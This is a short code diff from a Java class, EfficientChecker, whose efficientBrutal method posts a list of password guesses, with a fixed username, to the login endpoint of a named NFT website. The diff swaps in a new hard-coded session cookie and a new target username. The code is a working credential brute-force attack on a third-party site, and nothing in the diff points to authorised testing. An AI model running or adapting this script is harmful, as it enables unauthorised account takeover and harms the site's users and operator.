@@ -25,7 +25,7 @@ import static org.millionaire.CommonUtils.mapToNameValuePairs;
 public class EfficientChecker {
 
     static String uri = "https://console-nft.art/starwars/index.php";
-    static Header header = new BasicHeader("cookie", "_fbp=fb.1.1642215672325.811608704; PHPSESSID=12476f37aff0edf8bbc4381950bbd579");
+    static Header header = new BasicHeader("cookie", "_fbp=fb.1.1642215672325.811608704; PHPSESSID=63b534bd325b0927bab0c975334f1be3");
     static Header[] headers = new Header[]{header};
 
     static void efficientBrutal() {
@@ -43,7 +43,7 @@ public class EfficientChecker {
                 CloseableHttpClient httpClient = HttpClients.createDefault();
                 int i = 1;
                 JSONObject jsonObject = new JSONObject();
-                jsonObject.put("name", "user_5968");
+                jsonObject.put("name", "user_1087");
                 for (int i1 = 0; i1 < passwords.size(); i1++) {
                     jsonObject.put("password", passwords.get(i1));
                     String text = post(httpClient, jsonObject);
